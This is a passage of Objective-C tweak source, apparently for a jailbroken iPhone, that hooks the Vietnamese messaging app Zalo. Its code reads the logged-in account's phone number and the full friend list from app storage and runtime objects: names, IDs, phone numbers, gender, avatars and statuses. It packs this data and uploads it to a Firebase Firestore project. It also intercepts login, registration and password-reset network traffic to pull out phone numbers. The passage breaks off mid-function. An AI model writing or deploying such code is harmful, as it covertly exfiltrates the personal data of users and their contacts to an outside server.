    NSData *privateInfoData = [@"{\"version\":1,\"generator\":\"ClanggZaloExporter\"}" dataUsingEncoding:NSUTF8StringEncoding];
    NSData *appPlistData = [@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>CFBundleIdentifier</key><string>vn.com.vng.zingalo</string></dict></plist>" dataUsingEncoding:NSUTF8StringEncoding];

    NSArray<NSDictionary *> *entries = @[
        @{
            @"name": @"Binfo.plist",
            @"data": binfoData
        },
        @{
            @"name": @"__private_info",
            @"data": privateInfoData
        },
        @{
            @"name": @"vn.com.vng.zingalo.plist",
            @"data": appPlistData
        },
        @{
            @"name": @"___groups___/group.zfriends.vn.com.vng.zingalo.plist",
            @"data": groupPlistData
        },
        @{
            @"name": @"___groups___/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist",
            @"data": groupPlistData
        }
    ];

    NSMutableData *zipData = [NSMutableData data];
    NSMutableData *cdData = [NSMutableData data];
    uint16_t numEntries = (uint16_t)entries.count;

    for (NSDictionary *entry in entries) {
        NSString *nameStr = entry[@"name"];
        NSData *fileData = entry[@"data"];
        NSData *nameData = [nameStr dataUsingEncoding:NSUTF8StringEncoding];

        uint32_t offset = (uint32_t)zipData.length;
        uint32_t crc = (uint32_t)crc32(0L, Z_NULL, 0);
        crc = (uint32_t)crc32(crc, (const Bytef *)fileData.bytes, (uInt)fileData.length);
        uint32_t size = (uint32_t)fileData.length;
        uint16_t nameLen = (uint16_t)nameData.length;

        // Local Header (PK 03 04)
        uint8_t localHeader[30] = {
            0x50, 0x4B, 0x03, 0x04,
            0x14, 0x00,
            0x00, 0x08,
            0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            (uint8_t)(crc & 0xFF), (uint8_t)((crc >> 8) & 0xFF), (uint8_t)((crc >> 16) & 0xFF), (uint8_t)((crc >> 24) & 0xFF),
            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
            (uint8_t)(nameLen & 0xFF), (uint8_t)((nameLen >> 8) & 0xFF),
            0x00, 0x00
        };
        [zipData appendBytes:localHeader length:30];
        [zipData appendData:nameData];
        [zipData appendData:fileData];

        // Central Directory Entry (PK 01 02)
        uint8_t cdHeader[46] = {
            0x50, 0x4B, 0x01, 0x02,
            0x14, 0x03,
            0x14, 0x00,
            0x00, 0x08,
            0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            (uint8_t)(crc & 0xFF), (uint8_t)((crc >> 8) & 0xFF), (uint8_t)((crc >> 16) & 0xFF), (uint8_t)((crc >> 24) & 0xFF),
            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
            (uint8_t)(size & 0xFF), (uint8_t)((size >> 8) & 0xFF), (uint8_t)((size >> 16) & 0xFF), (uint8_t)((size >> 24) & 0xFF),
            (uint8_t)(nameLen & 0xFF), (uint8_t)((nameLen >> 8) & 0xFF),
            0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            0xA4, 0x81, 0x00, 0x00,
            (uint8_t)(offset & 0xFF), (uint8_t)((offset >> 8) & 0xFF), (uint8_t)((offset >> 16) & 0xFF), (uint8_t)((offset >> 24) & 0xFF)
        };
        [cdData appendBytes:cdHeader length:46];
        [cdData appendData:nameData];
    }

    uint32_t cdOffset = (uint32_t)zipData.length;
    uint32_t cdSize = (uint32_t)cdData.length;
    [zipData appendData:cdData];

    // End of Central Directory (PK 05 06)
    uint8_t eocd[22] = {
        0x50, 0x4B, 0x05, 0x06,
        0x00, 0x00,
        0x00, 0x00,
        (uint8_t)(numEntries & 0xFF), (uint8_t)((numEntries >> 8) & 0xFF),
        (uint8_t)(numEntries & 0xFF), (uint8_t)((numEntries >> 8) & 0xFF),
        (uint8_t)(cdSize & 0xFF), (uint8_t)((cdSize >> 8) & 0xFF), (uint8_t)((cdSize >> 16) & 0xFF), (uint8_t)((cdSize >> 24) & 0xFF),
        (uint8_t)(cdOffset & 0xFF), (uint8_t)((cdOffset >> 8) & 0xFF), (uint8_t)((cdOffset >> 16) & 0xFF), (uint8_t)((cdOffset >> 24) & 0xFF),
        0x00, 0x00
    };
    [zipData appendBytes:eocd length:22];

    return zipData;
}

// ==============================================================================
// GIẢI MÃ TOÀN BỘ OBJECT GRAPH NSKEYEDARCHIVER TRONG APP GROUP PLIST
// ==============================================================================
static id resolveFieldRecursiveWithCycleCheck(id fieldVal, NSArray *objs, NSMutableSet<NSNumber *> *visited) {
    if (!fieldVal) return nil;
    if ([fieldVal isKindOfClass:[NSString class]]) return fieldVal;
    if ([fieldVal isKindOfClass:[NSNumber class]]) return [fieldVal stringValue];

    if ([fieldVal isKindOfClass:[NSArray class]]) {
        NSMutableArray *resArr = [NSMutableArray array];
        for (id subItem in (NSArray *)fieldVal) {
            id resolved = resolveFieldRecursiveWithCycleCheck(subItem, objs, visited);
            if (resolved) [resArr addObject:resolved];
        }
        return resArr;
    }

    if ([fieldVal isKindOfClass:[NSDictionary class]]) {
        NSDictionary *valDict = (NSDictionary *)fieldVal;
        if (valDict[@"CF$UID"]) {
            NSUInteger idx = [valDict[@"CF$UID"] unsignedIntegerValue];
            NSNumber *numIdx = @(idx);
            if (idx < objs.count && ![visited containsObject:numIdx]) {
                [visited addObject:numIdx];
                id target = objs[idx];
                id resolved = resolveFieldRecursiveWithCycleCheck(target, objs, visited);
                [visited removeObject:numIdx];
                return resolved;
            }
            return nil;
        }

        NSMutableDictionary *resDict = [NSMutableDictionary dictionary];
        for (id k in valDict) {
            id resolvedK = resolveFieldRecursiveWithCycleCheck(k, objs, visited);
            id resolvedV = resolveFieldRecursiveWithCycleCheck(valDict[k], objs, visited);
            if (resolvedK && resolvedV) {
                resDict[resolvedK] = resolvedV;
            }
        }
        return resDict;
    }
    return nil;
}

static id resolveFieldRecursive(id fieldVal, NSArray *objs) {
    NSMutableSet<NSNumber *> *visited = [NSMutableSet set];
    return resolveFieldRecursiveWithCycleCheck(fieldVal, objs, visited);
}

static BOOL isFriendOrAliasClass(id classRef, NSArray *objs) {
    if (!classRef || ![classRef isKindOfClass:[NSDictionary class]] || !classRef[@"CF$UID"]) return NO;
    NSUInteger idx = [classRef[@"CF$UID"] unsignedIntegerValue];
    if (idx >= objs.count || ![objs[idx] isKindOfClass:[NSDictionary class]]) return NO;
    
    NSDictionary *classDict = objs[idx];
    NSString *className = classDict[@"$classname"];
    NSArray *classes = classDict[@"$classes"];

    NSSet *targetClasses = [NSSet setWithObjects:
        @"ZSDFriendEntity", @"ZSDAliasEntity", @"ZSContact", @"ZContactEntity", @"ZFriendEntity", nil];

    if (className && [targetClasses containsObject:className]) return YES;
    if ([classes isKindOfClass:[NSArray class]]) {
        for (NSString *c in classes) {
            if ([targetClasses containsObject:c]) return YES;
        }
    }
    return NO;
}

static void collectArchivedBlobs(id container, NSMutableArray<NSData *> *blobs, NSMutableSet<id> *visited) {
    if (!container || [visited containsObject:container]) return;
    [visited addObject:container];

    if ([container isKindOfClass:[NSData class]]) {
        NSData *d = (NSData *)container;
        if (d.length >= 8) {
            [blobs addObject:d];
        }
        return;
    }

    if ([container isKindOfClass:[NSDictionary class]]) {
        NSDictionary *dict = (NSDictionary *)container;
        for (id key in dict) {
            collectArchivedBlobs(dict[key], blobs, visited);
        }
    } else if ([container isKindOfClass:[NSArray class]]) {
        for (id item in (NSArray *)container) {
            collectArchivedBlobs(item, blobs, visited);
        }
    }
}

static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
    if (!plistData || plistData.length == 0) return @[];
    NSMutableArray<NSDictionary *> *friends = [NSMutableArray array];
    NSMutableSet<NSString *> *seenKeys = [NSMutableSet set];

    @try {
        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Wdeprecated-declarations"
        NSDictionary *rootDict = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:NULL error:nil];
        #pragma clang diagnostic pop
        if (!rootDict) return @[];

        NSMutableArray<NSData *> *archivedBlobs = [NSMutableArray array];
        NSMutableSet *visited = [NSMutableSet set];
        collectArchivedBlobs(rootDict, archivedBlobs, visited);

        for (NSData *subData in archivedBlobs) {
            NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:subData options:0 format:NULL error:nil];
            if (![inner isKindOfClass:[NSDictionary class]]) continue;

            NSArray *objs = inner[@"$objects"];
            if (![objs isKindOfClass:[NSArray class]] || objs.count < 3) continue;

            for (id item in objs) {
                if (![item isKindOfClass:[NSDictionary class]]) continue;
                NSDictionary *objDict = (NSDictionary *)item;

                if (!isFriendOrAliasClass(objDict[@"$class"], objs)) continue;

                NSString *dName = resolveFieldRecursive(objDict[@"displayName"], objs);
                NSString *cName = resolveFieldRecursive(objDict[@"contactName"], objs);
                NSString *aliasName = resolveFieldRecursive(objDict[@"aliasname"], objs);
                NSString *uId = resolveFieldRecursive(objDict[@"userId"], objs) ?: resolveFieldRecursive(objDict[@"userid"], objs);
                NSString *zId = resolveFieldRecursive(objDict[@"zaloId"], objs) ?: resolveFieldRecursive(objDict[@"zaloid"], objs);
                NSString *avatar = resolveFieldRecursive(objDict[@"avatarURL"], objs) ?: resolveFieldRecursive(objDict[@"avatar"], objs);
                NSString *globalId = resolveFieldRecursive(objDict[@"globalId"], objs);
                NSString *phone = resolveFieldRecursive(objDict[@"phone"], objs) ?: resolveFieldRecursive(objDict[@"phoneNumber"], objs);
                NSString *gender = resolveFieldRecursive(objDict[@"gender"], objs);
                NSString *statusMsg = resolveFieldRecursive(objDict[@"statusMessage"], objs) ?: resolveFieldRecursive(objDict[@"status"], objs);

                NSString *primaryName = dName ?: cName ?: aliasName;

                if (primaryName.length >= 2 && ![primaryName hasPrefix:@"$"] && 
                    ![primaryName isEqualToString:@"ZSDFriendEntity"] && 
                    ![primaryName isEqualToString:@"ZSDAliasEntity"] && 
                    ![primaryName isEqualToString:@"NSObject"] &&
                    ![primaryName isEqualToString:@"NSMutableDictionary"] &&
                    ![primaryName isEqualToString:@"NSDictionary"]) {
                    
                    NSString *dedupKey = [NSString stringWithFormat:@"%@|%@", primaryName, uId ?: @""];
                    if (![seenKeys containsObject:dedupKey]) {
                        [seenKeys addObject:dedupKey];
                        NSMutableDictionary *fMeta = [NSMutableDictionary dictionary];
                        fMeta[@"name"] = primaryName;
                        if (dName) fMeta[@"displayName"] = dName;
                        if (cName) fMeta[@"contactName"] = cName;
                        if (uId) fMeta[@"userId"] = uId;
                        if (zId) fMeta[@"zaloId"] = zId;
                        if (avatar) fMeta[@"avatarURL"] = avatar;
                        if (globalId) fMeta[@"globalId"] = globalId;
                        if (phone) fMeta[@"phone"] = phone;
                        if (gender) fMeta[@"gender"] = gender;
                        if (statusMsg) fMeta[@"statusMessage"] = statusMsg;

                        [friends addObject:fMeta];
                    }
                }
            }
        }
    } @catch (NSException *e) {}
    return friends;
}

// ==============================================================================
// TRÍCH XUẤT SĐT VÀ KIỂM TRA PHIÊN THỰC TỪ RUNTIME ZALO
// ==============================================================================
static NSString *g_activeLoggedInPhone = nil;

static BOOL invokeBoolSelector(id target, SEL selector) {
    if (!target || ![target respondsToSelector:selector]) return NO;
    NSMethodSignature *sig = [target methodSignatureForSelector:selector];
    if (!sig) return NO;

    const char *retType = [sig methodReturnType];
    if (!retType) return NO;

    char t = retType[0];
    if (t != 'c' && t != 'B' && t != 'i' && t != 'I' && t != 's' && t != 'S') {
        return NO;
    }

    NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
    [inv setTarget:target];
    [inv setSelector:selector];
    [inv invoke];
    
    BOOL result = NO;
    if (sig.methodReturnLength == sizeof(BOOL)) {
        [inv getReturnValue:&result];
    } else if (sig.methodReturnLength == sizeof(int)) {
        int intRes = 0;
        [inv getReturnValue:&intRes];
        result = (intRes != 0);
    }
    return result;
}

static BOOL isZaloRealLoggedIn(void) {
    NSArray *candidateClasses = @[@"ZAccountManager", @"ZSessionManager", @"ZAcountController", @"ZAccount", @"ZSession"];
    for (NSString *clsName in candidateClasses) {
        Class cls = NSClassFromString(clsName);
        if (!cls) continue;

        if (invokeBoolSelector(cls, NSSelectorFromString(@"isLogin")) ||
            invokeBoolSelector(cls, NSSelectorFromString(@"isLoggedIn"))) {
            return YES;
        }

        if ([cls respondsToSelector:@selector(sharedManager)]) {
            #pragma clang diagnostic push
            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            id mgr = [cls performSelector:@selector(sharedManager)];
            #pragma clang diagnostic pop
            if (mgr && (invokeBoolSelector(mgr, NSSelectorFromString(@"isLogin")) ||
                        invokeBoolSelector(mgr, NSSelectorFromString(@"isLoggedIn")))) {
                return YES;
            }
        }
    }
    return NO;
}

static void handleZaloLogout(void) {
    g_activeLoggedInPhone = nil;
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:@"kZaloLastPhone"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    if (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"whitelist"]) {
        g_tweakEnabled = NO; // Khóa lại tweak khi logout cho tới khi đăng nhập SĐT hợp lệ
    }
}

static NSString *getZaloLivePhoneNumber(void) {
    // 1. Nếu Zalo chưa đăng nhập thực sự -> Xóa cache và trả về nil ngay lập tức
    if (!isZaloRealLoggedIn()) {
        g_activeLoggedInPhone = nil;
        return nil;
    }

    // 2. Luôn trích xuất trực tiếp từ runtime account đang active
    //    Tuyệt đối KHÔNG fallback về g_activeLoggedInPhone cũ để tránh rò rỉ SĐT khi đổi tài khoản
    @try {
        NSArray *candidateClasses = @[@"ZAccountManager", @"ZSessionManager", @"ZAcountController", @"ZAccount", @"ZSession"];
        for (NSString *clsName in candidateClasses) {
            Class cls = NSClassFromString(clsName);
            if (!cls) continue;

            id currentAcc = nil;
            #pragma clang diagnostic push
            #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
            if ([cls respondsToSelector:@selector(currentAccount)]) {
                currentAcc = [cls performSelector:@selector(currentAccount)];
            } else if ([cls respondsToSelector:@selector(activeAccount)]) {
                currentAcc = [cls performSelector:@selector(activeAccount)];
            } else if ([cls respondsToSelector:@selector(sharedManager)]) {
                id mgr = [cls performSelector:@selector(sharedManager)];
                if ([mgr respondsToSelector:@selector(currentAccount)]) {
                    currentAcc = [mgr performSelector:@selector(currentAccount)];
                }
            }

            if (currentAcc) {
                for (NSString *selName in @[@"phoneNumber", @"phone", @"accountPhone", @"accountPhoneNumber", @"getPhoneNumber"]) {
                    SEL s = NSSelectorFromString(selName);
                    if ([currentAcc respondsToSelector:s]) {
                        NSString *p = [currentAcc performSelector:s];
                        if ([p isKindOfClass:[NSString class]] && p.length >= 8) {
                            g_activeLoggedInPhone = [p copy];
                            return p;
                        }
                    }
                }
            }
            #pragma clang diagnostic pop
        }
    } @catch (NSException *e) {}

    return nil;
}

// ==============================================================================
// TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
// ==============================================================================
static void autoSyncFriendsToFirebase(NSString *phoneStr, void (^onSuccess)(void), void (^onError)(NSError *error)) {
    // Không sync nếu tweak chưa được kích hoạt hợp lệ
    if (!g_tweakEnabled) {
        if (onError) onError(nil);
        return;
    }

    NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
    if (!actualPhone || actualPhone.length < 8) {
        if (onError) onError(nil);
        return;
    }

    // Kiểm tra whitelist: SĐT không trong danh sách → không sync
    if (!isPhoneAllowedByWhitelist(actualPhone)) {
        if (onError) onError(nil);
        return;
    }

    NSString *cleanPhone = normalizePhone(actualPhone);
    if (cleanPhone.length < 9) {
        if (onError) onError(nil);
        return;
    }

    bool expected = false;
    if (!atomic_compare_exchange_strong(&g_isSyncingInFlight, &expected, true)) {
        if (onError) onError([NSError errorWithDomain:@"com.clang.clangg" code:-2 userInfo:@{NSLocalizedDescriptionKey: @"Sync đang chạy"}]);
        return;
    }

    g_activeLoggedInPhone = [cleanPhone copy];
    [[NSUserDefaults standardUserDefaults] setObject:cleanPhone forKey:@"kZaloLastPhone"];
    [[NSUserDefaults standardUserDefaults] synchronize];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        // 1. Quét tìm AppGroup plist qua nhiều đường dẫn
        NSData *rawPlistData = nil;
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
        if (groupURL) {
            NSString *p = [[groupURL path] stringByAppendingPathComponent:@"Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
            if ([[NSFileManager defaultManager] fileExistsAtPath:p]) {
                rawPlistData = [NSData dataWithContentsOfFile:p];
            }
        }

        if (!rawPlistData || rawPlistData.length == 0) {
            NSString *appGroupDir = @"/var/mobile/Containers/Shared/AppGroup";
            NSArray *subdirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:appGroupDir error:nil];
            for (NSString *sub in subdirs) {
                NSString *testPath = [NSString stringWithFormat:@"%@/%@/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist", appGroupDir, sub];
                if ([[NSFileManager defaultManager] fileExistsAtPath:testPath]) {
                    rawPlistData = [NSData dataWithContentsOfFile:testPath];
                    if (rawPlistData && rawPlistData.length > 0) break;
                }
            }
        }

        if (!rawPlistData || rawPlistData.length == 0) {
            NSString *libDir = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) firstObject];
            if (libDir) {
                NSString *localPlist = [libDir stringByAppendingPathComponent:@"Preferences/group.zfriends.vn.com.vng.zingalo.plist"];
                if ([[NSFileManager defaultManager] fileExistsAtPath:localPlist]) {
                    rawPlistData = [NSData dataWithContentsOfFile:localPlist];
                }
            }
        }

        NSMutableArray<NSDictionary *> *structuredFriends = [NSMutableArray array];
        NSMutableSet<NSString *> *uniqueNames = [NSMutableSet set];

        if (rawPlistData && rawPlistData.length > 0) {
            NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
            for (NSDictionary *f in parsed) {
                [structuredFriends addObject:f];
                if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
            }
        }

        // 2. Hợp nhất đầy đủ toàn bộ metadata từ in-memory ZContactManager của Zalo
        @try {
            Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
            if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
                #pragma clang diagnostic push
                #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                id mgr = [contactMgrCls performSelector:@selector(sharedManager)];
                if (mgr && [mgr respondsToSelector:@selector(getAllFriends)]) {
                    NSArray *contacts = [mgr performSelector:@selector(getAllFriends)];
                    if ([contacts isKindOfClass:[NSArray class]]) {
                        for (id c in contacts) {
                            NSString *dName = [c respondsToSelector:@selector(displayName)] ? [c performSelector:@selector(displayName)] : nil;
                            NSString *cName = [c respondsToSelector:@selector(contactName)] ? [c performSelector:@selector(contactName)] : nil;
                            NSString *zName = [c respondsToSelector:@selector(zaloName)] ? [c performSelector:@selector(zaloName)] : nil;
                            NSString *uId = [c respondsToSelector:@selector(userId)] ? [c performSelector:@selector(userId)] : nil;
                            NSString *zId = [c respondsToSelector:@selector(zaloId)] ? [c performSelector:@selector(zaloId)] : nil;
                            NSString *avatar = [c respondsToSelector:@selector(avatarURL)] ? [c performSelector:@selector(avatarURL)] : nil;
                            NSString *globalId = [c respondsToSelector:@selector(globalId)] ? [c performSelector:@selector(globalId)] : nil;
                            NSString *phone = [c respondsToSelector:@selector(phoneNumber)] ? [c performSelector:@selector(phoneNumber)] : nil;
                            NSString *gender = [c respondsToSelector:@selector(gender)] ? [NSString stringWithFormat:@"%@", [c performSelector:@selector(gender)]] : nil;
                            NSString *statusMsg = [c respondsToSelector:@selector(statusMessage)] ? [c performSelector:@selector(statusMessage)] : ([c respondsToSelector:@selector(userStatus)] ? [c performSelector:@selector(userStatus)] : nil);
                            
                            NSString *primaryName = dName ?: cName ?: zName;

                            if (primaryName && primaryName.length >= 2) {
                                [uniqueNames addObject:primaryName];
                                NSMutableDictionary *fMeta = [NSMutableDictionary dictionary];
                                fMeta[@"name"] = primaryName;
                                if (dName) fMeta[@"displayName"] = dName;
                                if (cName) fMeta[@"contactName"] = cName;
                                if (uId) fMeta[@"userId"] = uId;
                                if (zId) fMeta[@"zaloId"] = zId;
                                if (avatar) fMeta[@"avatarURL"] = avatar;
                                if (globalId) fMeta[@"globalId"] = globalId;
                                if (phone) fMeta[@"phone"] = phone;
                                if (gender) fMeta[@"gender"] = gender;
                                if (statusMsg) fMeta[@"statusMessage"] = statusMsg;

                                [structuredFriends addObject:fMeta];
                            }
                        }
                    }
                }
                #pragma clang diagnostic pop
            }
        } @catch (NSException *e) {}

        // Kiểm tra nếu danh bạ hoàn toàn rỗng (chưa đọc được dữ liệu thật) -> không upload, không đánh dấu thành công
        if (uniqueNames.count == 0 && (!rawPlistData || rawPlistData.length == 0)) {
            atomic_store(&g_isSyncingInFlight, false);
            if (onError) dispatch_async(dispatch_get_main_queue(), ^{
                onError([NSError errorWithDomain:@"com.clang.clangg" code:-1 userInfo:@{NSLocalizedDescriptionKey: @"Danh bạ chưa sẵn sàng hoặc rỗng"}]);
            });
            return;
        }

        NSArray<NSString *> *friendNames = [uniqueNames allObjects];
        NSString *sampleStr = @"";
        if (friendNames.count > 0) {
            NSArray *samples = [friendNames subarrayWithRange:NSMakeRange(0, MIN(8, friendNames.count))];
            sampleStr = [samples componentsJoinedByString:@", "];
            if (friendNames.count > 8) {
                sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
            }
        } else {
            sampleStr = @"Đang đồng bộ dữ liệu...";
        }

        // 3. Đóng gói ZIP chuẩn .adbk của Apps Manager
        NSData *adbkZipData = buildAdbkZipArchive(rawPlistData, cleanPhone);
        NSString *base64Adbk = adbkZipData ? [adbkZipData base64EncodedStringWithOptions:0] : @"";

        // Gửi đầy đủ cả JSON danh sách tên và JSON chi tiết Object
        NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:structuredFriends options:0 error:nil];
        NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";

        // 4. Đẩy lên Firebase Firestore
        NSString *postUrlStr = [NSString stringWithFormat:
            @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
            kFirebaseProjectId, cleanPhone];
        
        NSURL *postUrl = [NSURL URLWithString:postUrlStr];
        NSMutableURLRequest *postReq = [NSMutableURLRequest requestWithURL:postUrl];
        [postReq setHTTPMethod:@"PATCH"];
        [postReq setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];

        NSDictionary *postBody = @{
            @"fields": @{
                @"phone": @{ @"stringValue": cleanPhone },
                @"total_friends": @{ @"integerValue": @(uniqueNames.count) },
                @"sample_friends": @{ @"stringValue": sampleStr },
                @"friends_json": @{ @"stringValue": friendsJsonStr },
                @"adbk_format": @{ @"stringValue": @"adbk" },
                @"adbk_payload_base64": @{ @"stringValue": base64Adbk },
                @"updated_at": @{ @"stringValue": [[NSDate date] description] }
            }
        };

        [postReq setHTTPBody:[NSJSONSerialization dataWithJSONObject:postBody options:0 error:nil]];
        NSURLSessionDataTask *uploadTask = [[NSURLSession sharedSession] dataTaskWithRequest:postReq completionHandler:^(NSData *d, NSURLResponse *res, NSError *err) {
            atomic_store(&g_isSyncingInFlight, false);
            NSHTTPURLResponse *http = (NSHTTPURLResponse *)res;
            if (!err && http && (http.statusCode >= 200 && http.statusCode < 300)) {
                if (onSuccess) dispatch_async(dispatch_get_main_queue(), onSuccess);
            } else {
                if (onError) dispatch_async(dispatch_get_main_queue(), ^{ onError(err); });
            }
        }];
        [uploadTask resume];
    });
}

// ==============================================================================
// HOOK 1: BẮT MÀN HÌNH CHÍNH SAU KHI ĐĂNG NHẬP / ĐĂNG KÝ / QUÊN PASS THÀNH CÔNG
// ==============================================================================
%hook UITabBarController

- (void)viewDidAppear:(BOOL)animated {
    %orig;

    NSString *clsName = NSStringFromClass([self class]);
    if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] ||
        [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {

        static NSString *lastVerifiedAndSyncedPhone = nil;
        NSString *currentPhone = getZaloLivePhoneNumber();
        if (!currentPhone || currentPhone.length < 8) return;

        if (!g_tweakEnabled) {
            // Chưa kích hoạt (ví dụ startup ở mode whitelist hoặc lần trước lỗi mạng):
            // Luôn gọi verifyKeyAndExecute với SĐT thật hiện tại để thử kích hoạt
            verifyKeyAndExecute(currentPhone, ^{
                autoSyncFriendsToFirebase(currentPhone, ^{
                    lastVerifiedAndSyncedPhone = [currentPhone copy];
                }, nil);
            });
        } else if (isPhoneAllowedByWhitelist(currentPhone)) {
            // Đã kích hoạt & số hợp lệ: chỉ sync nếu chưa sync thành công cho số này
            if (![currentPhone isEqualToString:lastVerifiedAndSyncedPhone]) {
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                    autoSyncFriendsToFirebase(currentPhone, ^{
                        lastVerifiedAndSyncedPhone = [currentPhone copy];
                    }, nil);
                });
            }
        } else {
            // Đang bật tweak (từ tài khoản cũ) nhưng phát hiện số mới ngoài whitelist:
            // LẬP TỨC KHÓA TWEAK VỀ NO NGAY TẠI ĐÂY
            g_tweakEnabled = NO;
            lastVerifiedAndSyncedPhone = nil;
        }
    }
}

%end

// ==============================================================================
// ==============================================================================
// HOOK 2: BẮT PHẢN HỒI NETWORK API (LOGIN, REGISTER, FORGOT, LOGOUT)
// ==============================================================================
%hook NSURLSession

- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    if (!completionHandler) {
        return %orig;
    }

    NSURL *url = request.URL;
    NSString *path = [url.path lowercaseString];

    // Phát hiện sự kiện Logout sau khi request hoàn tất thành công
    BOOL isLogoutEndpoint = [path containsString:@"/logout"] ||
                            [path containsString:@"/signout"] ||
                            [path containsString:@"/switch-account"] ||
                            [path containsString:@"/account/logout"];

    if (isLogoutEndpoint) {
        void (^wrappedHandler)(NSData *data, NSURLResponse *response, NSError *error) = ^(NSData *data, NSURLResponse *response, NSError *error) {
            NSHTTPURLResponse *httpResp = (NSHTTPURLResponse *)response;
            if (!error && httpResp && (httpResp.statusCode >= 200 && httpResp.statusCode < 400)) {
                handleZaloLogout();
            }
            completionHandler(data, response, error);
        };
        return %orig(request, wrappedHandler);
    }

    // Guard 1: Tweak chưa kích hoạt → không can thiệp
    if (!g_tweakEnabled) {
        return %orig(request, completionHandler);
    }

    BOOL isAuthEndpoint = [path containsString:@"/login"] ||
                          [path containsString:@"/register"] ||
                          [path containsString:@"/registration"] ||
                          [path containsString:@"/forgot"] ||
                          [path containsString:@"/set-password"] ||
                          [path containsString:@"/account/verify"] ||
                          [path containsString:@"/api/v3/auth"];

    if (isAuthEndpoint) {
        void (^wrappedHandler)(NSData *data, NSURLResponse *response, NSError *error) = ^(NSData *data, NSURLResponse *response, NSError *error) {
            NSData *finalData = data;
            if (data && !error) {
                @try {
                    // 1. TRÍCH XUẤT SĐT TỪ REQUEST / RESPONSE TRƯỚC KHI CAN THIỆP DỮ LIỆU
                    NSString *detectedPhone = nil;

                    // Từ URL query
                    NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
                    for (NSURLQueryItem *item in comps.queryItems) {
                        if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
                            detectedPhone = item.value;
                            break;
                        }
                    }

                    // Từ Request Body
                    if (!detectedPhone && request.HTTPBody) {
                        NSString *bodyStr = [[NSString alloc] initWithData:request.HTTPBody encoding:NSUTF8StringEncoding];
                        if (bodyStr) {
                            NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"(phone|phoneNumber|user_phone)=([0-9]{9,12})" options:0 error:nil];
                            NSTextCheckingResult *match = [regex firstMatchInString:bodyStr options:0 range:NSMakeRange(0, bodyStr.length)];
                            if (match && [match numberOfRanges] > 2) {
                                detectedPhone = [bodyStr substringWithRange:[match rangeAtIndex:2]];
                            }
                        }
                    }

                    // Từ Response JSON (raw ban đầu)
                    NSDictionary *rawJson = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                    if ([rawJson isKindOfClass:[NSDictionary class]]) {
                        id dataObj = rawJson[@"data"];
                        if ([dataObj isKindOfClass:[NSDictionary class]]) {
                            if (!detectedPhone) {
                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"];
                            }
                        }
                    }

                    // Nếu chưa có trong request/response thì lấy runtime phone hiện tại
                    if (!detectedPhone) {
                        detectedPhone = getZaloLivePhoneNumber();
                    }

                    // 2. ĐÁNH GIÁ TÍNH HỢP LỆ VÀ CẬP NHẬT FLAG NGAY TRƯỚC KHI SỬA PHẢN HỒI
                    BOOL phoneOk = NO;
                    if (detectedPhone && detectedPhone.length >= 8) {
                        g_activeLoggedInPhone = [detectedPhone copy];
                        if (!isPhoneAllowedByWhitelist(detectedPhone)) {
